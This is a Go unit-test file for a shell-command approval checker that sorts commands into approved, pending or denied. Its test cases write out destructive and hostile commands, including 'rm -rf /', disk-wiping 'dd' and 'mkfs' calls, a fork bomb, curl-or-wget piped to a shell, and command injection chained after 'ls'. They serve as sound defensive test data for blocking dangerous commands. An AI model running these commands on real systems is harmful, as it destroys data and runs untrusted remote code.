package approval

import (
	"context"
	"testing"
)

// ---------------------------------------------------------------------------
// TestCheck_SafeCommands verifies that benign read-only commands are
// auto-approved under the default "smart" mode.
// ---------------------------------------------------------------------------
func TestCheck_SafeCommands(t *testing.T) {
	t.Parallel()

	c := NewChecker("smart", nil, nil)
	ctx := context.Background()

	tests := []struct {
		name    string
		command string
	}{
		{"ls", "ls"},
		{"ls with flags", "ls -la /tmp"},
		{"pwd", "pwd"},
		{"cat file", "cat file.txt"},
		{"echo hello", "echo hello"},
		{"whoami", "whoami"},
		{"date", "date"},
		{"uname", "uname -a"},
		{"env", "env"},
		{"which go", "which go"},
		{"grep pattern", "grep pattern file.go"},
		{"df disk", "df -h"},
		{"ps aux", "ps aux"},
		{"git status", "git status"},
		{"git log", "git log --oneline"},
		{"docker ps", "docker ps"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			result, reason := c.Check(ctx, tc.command)
			if result != Approved {
				t.Errorf("Check(%q) = %v, want Approved; reason: %s", tc.command, result, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestCheck_DangerousCommands verifies that commands matching a dangerous
// pattern return Pending (requiring user approval) under "smart" mode.
// ---------------------------------------------------------------------------
func TestCheck_DangerousCommands(t *testing.T) {
	t.Parallel()

	c := NewChecker("smart", nil, nil)
	ctx := context.Background()

	tests := []struct {
		name    string
		command string
	}{
		{"rm recursive", "rm -r /tmp/old"},
		{"git push force", "git push --force origin main"},
		{"git push force short flag", "git push -f"},
		{"curl pipe sh", "curl http://example.com | bash"},
		{"wget pipe sh", "wget http://example.com | sh"},
		{"eval", "eval $(echo danger)"},
		{"SQL DROP TABLE", "DROP TABLE users"},
		{"SQL TRUNCATE", "TRUNCATE TABLE logs"},
		{"SQL DELETE FROM", "DELETE FROM users"},
		{"mv to etc", "mv myfile /etc/config"},
		{"cp to usr", "cp binary /usr/local/bin/"},
		{"chown system path", "chown user /etc/passwd"},
		{"docker privileged", "docker run --privileged ubuntu"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			result, reason := c.Check(ctx, tc.command)
			if result != Pending {
				t.Errorf("Check(%q) = %v, want Pending; reason: %s", tc.command, result, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestCheck_HardBlocked verifies that truly destructive commands are
// Denied regardless of the approval mode.
// ---------------------------------------------------------------------------
func TestCheck_HardBlocked(t *testing.T) {
	t.Parallel()

	ctx := context.Background()

	// Test across modes where hard-blocked patterns are enforced.
	// Note: "off" mode returns Approved before reaching hard-blocked checks.
	modes := []string{"smart", "always"}

	tests := []struct {
		name    string
		command string
	}{
		{"rm -rf root", "rm -rf /"},
		{"rm -rf root star", "rm -rf /*"},
		{"rm -rf home root", "rm -rf ~/"},
		{"mkfs", "mkfs -t ext4 /dev/sda1"},
		{"dd to device", "dd if=/dev/zero of=/dev/sda"},
		{"dd to nvme", "dd if=/dev/zero of=/dev/nvme0n1"},
		{"shutdown", "shutdown -h now"},
		{"reboot", "reboot now"},
		{"poweroff", "poweroff now"},
		{"fork bomb", ":(){ :|:& };:"},
		{"fdisk", "fdisk /dev/sda"},
		{"chmod 777 root", "chmod -R 777 /"},
	}

	for _, mode := range modes {
		t.Run("mode="+mode, func(t *testing.T) {
			t.Parallel()
			c := NewChecker(mode, nil, nil)
			for _, tc := range tests {
				result, reason := c.Check(ctx, tc.command)
				if result != Denied {
					t.Errorf("mode=%s Check(%q) = %v, want Denied; reason: %s", mode, tc.command, result, reason)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestCheck_ShellMetacharacters verifies that safe-looking commands with
// shell chaining metacharacters are not auto-approved.
// ---------------------------------------------------------------------------
func TestCheck_ShellMetacharacters(t *testing.T) {
	t.Parallel()

	c := NewChecker("smart", nil, nil)
	ctx := context.Background()

	tests := []struct {
		name    string
		command string
	}{
		{"semicolon chain", "ls; rm -rf /"},
		{"pipe chain", "ls | rm"},
		{"backtick injection", "ls `rm -rf /`"},
		{"dollar-paren injection", "ls $(rm -rf /)"},
		{"and chain", "ls && rm -rf /"},
		{"or chain", "ls || rm -rf /"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			// The command starts with a safe pattern ("ls") but contains
			// metacharacters, so isSafe should return false. Depending on
			// what follows, the result should be Pending (dangerous) or
			// at least NOT Approved via the safe path.
			result, reason := c.Check(ctx, tc.command)
			if result == Approved && !containsShellMetacharacters(tc.command) {
				// If somehow approved, it must be because metacharacters
				// were not detected — that's a bug.
				t.Errorf("Check(%q) = %v (Approved), want non-Approved; reason: %s", tc.command, result, reason)
			}
			// Stronger check: the command must not be classified as safe.
			if c.isSafe(tc.command) {
				t.Errorf("isSafe(%q) = true, want false (metacharacters should prevent safe classification)", tc.command)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestCheck_CustomBlocklist verifies that custom blocklist entries cause
// denial, and custom allowlist entries cause auto-approval.
// ---------------------------------------------------------------------------
func TestCheck_CustomBlocklist(t *testing.T) {
	t.Parallel()

	ctx := context.Background()

	t.Run("blocklist denies matching command", func(t *testing.T) {
		t.Parallel()
		c := NewChecker("smart", nil, []string{"dangerous-tool"})
		result, reason := c.Check(ctx, "dangerous-tool --run")
		if result != Denied {
			t.Errorf("Check(%q) = %v, want Denied; reason: %s", "dangerous-tool --run", result, reason)
		}
	})

	t.Run("blocklist does not affect unrelated commands", func(t *testing.T) {
		t.Parallel()
		c := NewChecker("smart", nil, []string{"dangerous-tool"})
		result, _ := c.Check(ctx, "ls")
		if result != Approved {
			t.Errorf("Check(\"ls\") was not Approved")
		}
	})

	t.Run("allowlist approves matching command", func(t *testing.T) {
		t.Parallel()
		// "rm -rf build/" would normally be Pending, but allowlist overrides.
		c := NewChecker("smart", []string{"rm -rf build/"}, nil)
		result, reason := c.Check(ctx, "rm -rf build/")
		if result != Approved {
			t.Errorf("Check(%q) = %v, want Approved; reason: %s", "rm -rf build/", result, reason)
		}
	})

	t.Run("blocklist takes precedence over hard-blocked check", func(t *testing.T) {
		t.Parallel()
		// A blocklist entry that matches before hard-blocked patterns are
		// evaluated should still result in Denied.
		c := NewChecker("smart", nil, []string{"custom-destructive"})
		result, reason := c.Check(ctx, "custom-destructive /dev/sda")
		if result != Denied {
			t.Errorf("Check(%q) = %v, want Denied; reason: %s", "custom-destructive /dev/sda", result, reason)
		}
	})
}

// ---------------------------------------------------------------------------
// TestCheck_AlwaysMode verifies behaviour under "always" mode.
// ---------------------------------------------------------------------------
func TestCheck_AlwaysMode(t *testing.T) {
	t.Parallel()

	c := NewChecker("always", nil, nil)
	ctx := context.Background()

	t.Run("safe command is still approved", func(t *testing.T) {
		t.Parallel()
		result, _ := c.Check(ctx, "ls -la")
		if result != Approved {
			t.Errorf("Check(\"ls -la\") was not Approved in always mode")
		}
	})

	t.Run("non-safe command requires approval", func(t *testing.T) {
		t.Parallel()
		result, _ := c.Check(ctx, "go test ./...")
		if result != Pending {
			t.Errorf("Check(\"go test ./...\") was not Pending in always mode")
		}
	})
}

// ---------------------------------------------------------------------------
// TestCheck_OffMode verifies that "off" mode approves everything except
// hard-blocked commands and custom blocklist entries.
// ---------------------------------------------------------------------------
func TestCheck_OffMode(t *testing.T) {
	t.Parallel()

	c := NewChecker("off", nil, nil)
	ctx := context.Background()

	tests := []struct {
		name    string
		command string
		want    Result
	}{
		{"ls approved", "ls", Approved},
		{"rm recursive approved in off", "rm -rf build/", Approved},
		{"git push force approved in off", "git push --force", Approved},
		{"empty command", "", Approved},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			result, _ := c.Check(ctx, tc.command)
			if result != tc.want {
				t.Errorf("Check(%q) = %v, want %v", tc.command, result, tc.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestCheck_EmptyCommand verifies that an empty string is approved.
// ---------------------------------------------------------------------------
func TestCheck_EmptyCommand(t *testing.T) {
	t.Parallel()

	c := NewChecker("smart", nil, nil)
	ctx := context.Background()

	result, _ := c.Check(ctx, "")
	if result != Approved {
		t.Errorf("Check('') = %v, want Approved", result)
	}
}

// ---------------------------------------------------------------------------
// TestCheck_SafeDelete verifies that rm -rf of relative local paths is
// considered safe (downgraded from dangerous), while absolute paths are not.
// ---------------------------------------------------------------------------
func TestCheck_SafeDelete(t *testing.T) {
	t.Parallel()

	c := NewChecker("smart", nil, nil)
	ctx := context.Background()

	t.Run("relative path is safe delete", func(t *testing.T) {
		t.Parallel()
		if !c.isSafeDelete("rm -rf build/") {
			t.Error("isSafeDelete(rm -rf build/) = false, want true")
		}
	})

	t.Run("absolute path is not safe delete", func(t *testing.T) {
		t.Parallel()
		if c.isSafeDelete("rm -rf /var/log") {
			t.Error("isSafeDelete(rm -rf /var/log) = true, want false")
		}
	})

	t.Run("home path is not safe delete", func(t *testing.T) {
		t.Parallel()
		if c.isSafeDelete("rm -rf ~/tmp") {
			t.Error("isSafeDelete(rm -rf ~/tmp) = true, want false")
		}
	})

	t.Run("parent path is not safe delete", func(t *testing.T) {
		t.Parallel()
		if c.isSafeDelete("rm -rf ..") {
			t.Error("isSafeDelete(rm -rf ..) = true, want false")
		}
	})

	t.Run("dot is not safe delete", func(t *testing.T) {
		t.Parallel()
		if c.isSafeDelete("rm -rf .") {
			t.Error("isSafeDelete(rm -rf .) = true, want false")
		}
	})

	t.Run("relative path approved in smart mode", func(t *testing.T) {
		t.Parallel()
		// "rm -rf build/" matches dangerousPattern (recursive delete) but
		// isSafeDelete returns true, so it should be Approved.
		result, _ := c.Check(ctx, "rm -rf build/")
		if result != Approved {
			t.Errorf("Check('rm -rf build/') = %v, want Approved (safe delete)", result)
		}
	})
}
